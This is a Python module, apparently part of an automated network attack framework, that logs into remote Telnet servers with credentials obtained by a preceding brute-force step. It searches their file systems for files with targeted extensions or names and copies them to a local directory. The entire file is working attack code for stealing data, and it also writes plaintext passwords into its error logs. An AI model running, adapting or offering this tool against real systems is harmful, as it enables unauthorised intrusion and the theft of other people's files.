"""
steal_files_telnet.py - This script connects to remote Telnet servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import telnetlib
import logging
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_files_telnet.py", level=logging.DEBUG)

b_class = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port = 23


class StealFilesTelnet(BaseSteal):
    protocol_name = "telnet"
    credential_file_attr = "telnetfile"

    def connect(self, ip, username, password):
        try:
            tn = telnetlib.Telnet(ip)
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
            tn.read_until(b"$", timeout=10)
            logger.info(f"Connected to {ip} via Telnet with username {username}")
            return tn
        except Exception as e:
            logger.error(f"Telnet connection error for {ip} with user '{username}' & password '{password}': {e}")
            return None

    def find_items(self, tn, dir_path):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            tn.write(f'find {dir_path} -type f\n'.encode('ascii'))
            files = tn.read_until(b"$", timeout=10).decode('ascii').splitlines()
            matching_files = []
            for file in files:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted due to orchestrator exit.")
                    return []
                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                   any(file_name in file for file_name in self.shared_data.steal_file_names):
                    matching_files.append(file.strip())
            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files on Telnet: {e}")
            return []

    def steal_item(self, tn, remote_file, local_dir):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            normalized = os.path.normpath(remote_file).replace('\\', '/')
            if normalized.startswith('..') or '/../' in normalized or normalized == '..':
                logger.error(f"Path traversal detected in remote file path: {remote_file}")
                return
            rel = normalized.lstrip('/')
            local_file_path = os.path.join(local_dir, rel)
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                tn.write(f'cat {remote_file}\n'.encode('ascii'))
                f.write(tn.read_until(b"$", timeout=10))
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from Telnet: {e}")

    def disconnect(self, tn):
        tn.close()


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_telnet = StealFilesTelnet(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
